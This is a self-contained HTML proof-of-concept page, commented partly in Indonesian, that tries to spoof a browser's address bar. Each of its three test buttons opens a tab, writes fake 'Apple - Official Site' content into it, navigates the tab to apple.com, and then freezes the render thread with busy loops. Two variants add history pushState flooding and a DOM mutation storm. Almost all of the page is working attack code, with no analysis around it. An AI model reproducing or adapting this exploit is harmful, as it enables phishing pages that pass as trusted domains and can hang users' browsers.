<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />
    <title>Precision Pipeline Desync PoC - Zero</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #09090b;
        color: #fff;
        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      }
      .container {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100%;
        gap: 16px;
        padding: 20px;
        box-sizing: border-box;
      }
      h1 {
        font-size: 22px;
        margin-bottom: 10px;
        color: #f5f5f7;
        text-align: center;
      }
      button {
        width: 100%;
        max-width: 400px;
        padding: 18px 24px;
        font-size: 16px;
        font-weight: 600;
        background: #007aff;
        color: #fff;
        border: none;
        border-radius: 14px;
        cursor: pointer;
        box-shadow: 0 4px 16px rgba(0, 122, 255, 0.35);
        transition: transform 0.1s ease;
      }
      button:active {
        transform: scale(0.97);
      }
      .btn-danger {
        background: #ff3b30;
        box-shadow: 0 4px 16px rgba(255, 59, 48, 0.35);
      }
      .btn-warning {
        background: #ff9500;
        box-shadow: 0 4px 16px rgba(255, 149, 0, 0.35);
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h1>Precision Race-Window Test Suite</h1>
      
      <!-- Test 1: Micro-Delay & Synchronous Reflow Stalling -->
      <button id="test1">Test 1: Precision Race Stalling (Apple.com)</button>

      <!-- Test 2: History State Pollution + Pipeline Deadlock -->
      <button id="test2" class="btn-warning">Test 2: History Flooding + Lock</button>

      <!-- Test 3: DOM Mutation Storm & Main Thread Freeze -->
      <button id="test3" class="btn-danger">Test 3: DOM Mutation Storm Lock</button>
    </div>

    <script>
      // Helper untuk injeksi konten tampilan penyerang ke tab baru
      function injectAttackerContent(win) {
        if (!win) return;
        win.document.write(`
          <!DOCTYPE html>
          <html>
          <head>
            <title>Apple - Official Site</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
          </head>
          <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
            <div>
              <h1 style="font-size:42px;font-weight:700;color:#1d1d1f;margin:0 0 16px 0;">THIS IS NOT APPLE</h1>
              <p style="font-size:22px;color:#ff3b30;margin:0;font-weight:600;">RENDER PIPELINE DESYNCHRONIZED</p>
            </div>
          </body>
          </html>
        `);
        win.document.close();
        try { win.focus(); } catch (e) {}
      }

      // --- TEST 1: Precision Race Stalling ---
      document.getElementById("test1").onclick = function () {
        const newTab = window.open("", "_blank");
        if (newTab) {
          injectAttackerContent(newTab);
          
          // Timing 1: Memicu navigasi asinkron murni ke apple.com sangat cepat
          setTimeout(() => { 
            try {
              newTab.location.href = "https://apple.com";
            } catch(e) {}
          }, 8);

          // Timing 2: Mengunci render thread tepat saat antrean UI memperbarui address bar
          setTimeout(() => {
            try {
              newTab.eval(`
                const start = Date.now();
                while (Date.now() - start < 4000) {
                  // Memaksa pembacaan layout properties secara berulang untuk menjebak WebKit render engine
                  const h = document.body.offsetHeight;
                  document.body.style.background = (h % 2 === 0) ? '#ffffff' : '#fafafa';
                }
              `);
            } catch (e) {
              let s = Date.now(); while(Date.now() - s < 4000) {}
            }
          }, 35);
        }
      };

      // --- TEST 2: History State Pollution + Pipeline Deadlock ---
      document.getElementById("test2").onclick = function () {
        const newTab = window.open("", "_blank");
        if (newTab) {
          injectAttackerContent(newTab);
          setTimeout(() => {
            try {
              newTab.history.pushState({state: 'spoof'}, "", "#secure-enclave");
              newTab.location.href = "https://apple.com";
            } catch (err) {}
          }, 10);
          setTimeout(() => {
            try {
              newTab.eval(`
                const start = Date.now();
                while (Date.now() - start < 4000) {
                  history.pushState({rand: Math.random()}, "", "#flood");
                  const d = document.body.offsetHeight;
                }
              `);
            } catch (e) {
              let s = Date.now(); while(Date.now() - s < 4000) {}
            }
          }, 40);
        }
      };

      // --- TEST 3: DOM Mutation Storm & Main Thread Freeze ---
      document.getElementById("test3").onclick = function () {
        const newTab = window.open("", "_blank");
        if (newTab) {
          injectAttackerContent(newTab);
          setTimeout(() => {
            try {
              newTab.location.href = "https://apple.com";
            } catch (err) {}
          }, 8);
          setTimeout(() => {
            try {
              newTab.eval(`
                const start = Date.now();
                const body = document.body;
                while (Date.now() - start < 4500) {
                  const el = document.createElement('div');
                  el.innerText = Math.random();
                  body.appendChild(el);
                  if(body.childNodes.length > 50) body.innerHTML = "<h1>Locked State Active</h1>";
                }
              `);
            } catch (e) {
              let s = Date.now(); while(Date.now() - s < 4500) {}
            }
          }, 30);
        }
      };
    </script>
  </body>
</html>
